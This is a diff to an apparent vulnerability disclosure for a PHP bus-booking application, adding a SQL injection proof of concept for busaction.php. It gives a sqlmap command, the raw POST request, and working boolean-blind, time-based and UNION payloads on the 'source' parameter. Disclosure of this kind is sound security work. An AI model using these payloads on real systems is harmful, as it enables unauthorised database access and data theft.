@@ -213,6 +213,47 @@ $sql_price="SELECT * FROM `pricebus` WHERE `source` LIKE '$source' AND `dest` LI
 
 Parameterized queries or precompiled statements should be used to ensure that user input is processed and escaped correctly. This can prevent attackers from tampering with query logic by injecting malicious code.
 
+POC:
+sqlmap -r r.txt 
+r.txt:
+```
+POST /busaction.php HTTP/1.1
+Host: onlinebus
+Content-Length: 69
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://onlinebus
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://onlinebus/bookbus.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=jmetab2u149tgvq0m6nh6mbeh9
+Connection: close
+
+source=Dadoji+Kondadev+Stadium&dest=Court+Naka&number=2&login_submit=
+```
+
+![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/0388324f-8ebb-4700-b81d-70f5ada460bf)
+
+```
+Parameter: source (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: source=Dadoji Kondadev Stadium' AND 9227=9227 AND 'JvzU'='JvzU&dest=Court Naka&number=2&login_submit=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: source=Dadoji Kondadev Stadium' AND (SELECT 7739 FROM (SELECT(SLEEP(5)))FwZU) AND 'fZop'='fZop&dest=Court Naka&number=2&login_submit=
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: source=Dadoji Kondadev Stadium' UNION ALL SELECT NULL,CONCAT(0x716b7a6b71,0x476c6d577173505762704657657341764d436367577a5165456c4957486a4d417755726f7879636f,0x71766b7671),NULL,NULL,NULL-- -&dest=Court Naka&number=2&login_submit=
+---
+
+```
+
 
 # 5. busaction.php Cross-site Scripting (XSS)
 
